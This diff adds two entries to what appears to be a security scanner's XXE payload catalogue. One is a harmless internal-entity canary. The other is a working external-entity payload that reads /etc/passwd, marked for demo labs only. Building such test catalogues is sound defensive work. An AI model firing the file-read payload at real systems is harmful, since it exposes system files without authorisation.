@@ -1,0 +1,21 @@
+- id: xxe-internal-dtd-canary
+  category: xxe
+  engine: xml_dtd
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY darkxxe \"DARK_XXE_CANARY_8391\">]><r>&darkxxe;</r>"
+  expect: "DARK_XXE_CANARY_8391"
+  safe_scope: any
+  risk_level: safe
+  cwe: CWE-611
+  tags: [dtd-canary, non-exfiltrating]
+  description: Safe internal XML entity expansion canary (no file read or outbound call)
+
+- id: xxe-file-etc-passwd
+  category: xxe
+  engine: xml_external_entity
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+  expect: "root:.*:0:0:"
+  safe_scope: demo_lab_only
+  risk_level: medium
+  cwe: CWE-611
+  tags: [external-entity, demo-lab]
+  description: External entity file read probe (demo-lab only)
